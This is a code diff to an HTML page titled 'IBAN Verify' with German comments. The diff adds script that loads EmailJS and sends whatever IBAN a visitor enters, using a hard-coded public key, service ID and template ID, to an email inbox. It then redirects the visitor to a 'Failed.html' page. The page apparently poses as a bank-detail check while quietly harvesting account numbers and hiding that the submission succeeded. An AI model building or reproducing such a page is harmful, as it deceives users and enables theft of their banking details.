@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IBAN Page</title>
+    <title>IBAN Verify</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -100,14 +100,33 @@
             <h2>Enter IBAN</h2>
         </div>
         <!-- Formular zur neuen Seite -->
-        <form action="Failed.html" method="get">
+        <form id="iban-form">
             <!-- IBAN field with 'required' attribute -->
             <label for="iban">IBAN</label>
             <input type="text" id="iban" name="iban" required> <!-- Das 'required'-Attribut sorgt dafür, dass das Feld ausgefüllt sein muss -->
 
-            <!-- Submit button: type="submit" leitet nach Failed.html -->
+            <!-- Submit button -->
             <button type="submit">Submit</button>
         </form>
     </div>
+
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("wy5A1tCfcC4PVocyp"); // Ersetze dies mit deinem tatsächlichen Public Key
+        })();
+
+        document.getElementById('iban-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Verhindert das Standardverhalten des Formulars
+
+            // Sende das Formular an EmailJS
+            emailjs.sendForm('service_8vfu5la', 'template_5677c2d', this)
+                .then(function() {
+                    window.location.href = 'Failed.html'; 
+                }, function(error) {
+                    alert('Fehler beim Senden der Email: ' + JSON.stringify(error));
+                });
+        });
+    </script>
 </body>
 </html>
